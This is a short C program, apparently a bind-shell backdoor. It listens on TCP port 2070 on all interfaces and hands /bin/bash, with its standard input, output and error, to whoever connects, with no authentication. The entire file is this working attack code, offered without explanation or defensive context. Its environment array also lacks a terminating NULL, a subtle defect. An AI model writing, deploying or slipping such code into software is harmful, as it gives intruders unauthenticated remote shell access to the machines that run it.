#include <sys/socket.h>
#include <arpa/inet.h>
//#include <stdlib.h>
#include <unistd.h>

int main()
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(2070);
    addr.sin_addr.s_addr = INADDR_ANY;
    unsigned int len = sizeof(struct sockaddr_in);
    bind(sock, (struct sockaddr *)&addr, len);
    listen(sock, 5);
    struct sockaddr_in clientaddr;
    int client = accept(sock, (struct sockaddr *)&clientaddr, &len);
    dup2(client, 0);
    dup2(client, 1);
    dup2(client, 2);
    char *arguments[] = {"/bin/bash", 0};
    char* env[]={"TERM=linux"};
    execve(arguments[0], &arguments[0],&env[0]);
}
